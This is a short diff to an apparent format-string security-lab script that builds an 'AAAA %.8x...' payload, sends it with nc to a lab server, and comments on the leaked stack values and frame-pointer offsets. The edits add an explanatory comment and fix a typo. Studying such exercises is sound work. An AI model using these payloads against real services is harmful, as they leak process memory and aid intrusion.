@@ -7,6 +7,8 @@ def stack_data(N):
     s = "AAAA " + "%.8x "*N + "\n"
     fmt = (s).encode('latin-1')
     content[0:len(fmt)] = fmt
+    
+    # %x get 4 Bytes -> 1 Byte = 2 Hex; so 4 Bytes = 8 Hex -> %.8x
 
 
 N = 1500
@@ -35,7 +37,7 @@ server-10.9.0.5 | AAAA 11223344 00001000 08049da5 080e5320 080e61c0 ffffd250 fff
 # python3 task2A.py 64; cat badfile | nc 10.9.0.5 9090
 
 # the difference between Frame Pointer (0xffffd178) and the input buffer's address (0xffffd250) is 0xd8 -> 216 bytes -> 54 cells
-# so we need at list 54 cells to reach the Frame Pointer
+# so we need at least 54 cells to reach the Frame Pointer
 
 # with 64 cells we can see that the last one in 41414141 that is AAAA in hex
 
